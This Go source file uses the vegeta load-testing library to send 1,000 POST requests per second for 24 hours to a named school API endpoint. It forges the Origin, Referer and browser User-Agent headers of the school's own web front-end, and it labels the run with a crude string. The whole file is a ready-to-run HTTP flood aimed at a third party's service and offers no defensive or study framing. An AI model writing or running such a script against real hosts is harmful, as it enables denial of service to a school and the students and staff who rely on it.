package main

import (
	"fmt"
	vegeta "github.com/tsenart/vegeta/v12/lib"
	"time"
)

func main() {
	rate := vegeta.Rate{Freq: 1000, Per: time.Second}
	duration := 24 * time.Hour                    
	targeter := vegeta.NewStaticTargeter(vegeta.Target{
		Method: "POST",
		URL:    "https://apisismart.sismart.id/smkbnif/apischool/siswawali/tugas/guru?id=2727",
		Header: map[string][]string{
			"Content-Type": {"application/json"},
			"Accept":       {"application/json, text/plain, */*"},
			"Origin":       {"https://www.bismart.smkbinainformatika.sch.id"},
			"Referer":      {"https://www.bismart.smkbinainformatika.sch.id/"},
			"User-Agent":   {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"},
		},
	})
	attacker := vegeta.NewAttacker()

	var metrics vegeta.Metrics
	for res := range attacker.Attack(targeter, rate, duration, "Big Boobs!") {
		metrics.Add(res)
	}
	metrics.Close()

	fmt.Printf("99th percentile: %s\n", metrics.Latencies.P99)
}
